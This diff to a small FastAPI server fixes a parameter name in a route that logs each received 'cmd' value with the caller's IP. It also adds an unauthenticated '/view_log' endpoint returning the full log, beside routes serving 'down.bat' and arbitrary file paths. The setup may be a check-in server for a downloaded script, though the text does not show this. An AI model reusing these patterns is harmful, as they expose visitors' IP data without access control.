@@ -18,12 +18,19 @@ async def redi():
     return FileResponse(os.path.join('file','down.bat'), media_type='application/octet-stream',filename='down.bat')
 
 @app.get("/log/{cmd}")
-async def steps(step: str, request: Request):
+async def steps(cmd: str, request: Request):
     ip = request.client.host
     f = open('log', 'a')
     f.write(f'cmd {cmd} for {ip}\n')
     f.close()
     return 'ok'
+
+@app.get("/view_log")
+async def viewlog():
+    f = open('log', 'r')
+    log = f.read()
+    f.close()
+    return log
 
 @app.get("/video/{file_path}")
 async def main(file_path: str):
